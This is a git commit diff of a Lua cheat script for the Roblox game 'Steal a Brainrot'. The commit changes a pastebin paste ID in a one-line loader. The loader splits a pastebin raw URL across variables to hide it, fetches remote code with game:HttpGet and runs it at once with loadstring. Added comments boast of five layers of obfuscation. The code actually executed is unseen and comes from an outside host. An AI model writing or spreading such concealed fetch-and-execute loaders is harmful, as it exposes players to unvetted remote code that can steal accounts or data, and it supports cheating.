d8b8232236ae5aaa0d1c883303dec8db5b34a4a6
Darkhub <104821643+Jayjayart@users.noreply.github.com>
2026-04-15 17:12:11 +0800

    Update darkhubstealabrainrotscript.lua

--- darkhubstealabrainrotscript.lua
+++ darkhubstealabrainrotscript.lua
@@ -1,1 +1,3 @@
-local _="https://pastebin"local __=".com/raw/"local ___="GQyghJHD"(loadstring or load)(game:HttpGet(_..__..___))()
+local _="https://pastebin"local __=".com/raw/"local ___="GmmsCR0U"(loadstring or load)(game:HttpGet(_..__..___))()
+-- // pastebin method + obfuscator 5 layers
+-- // script was made by Darkluax on youtube
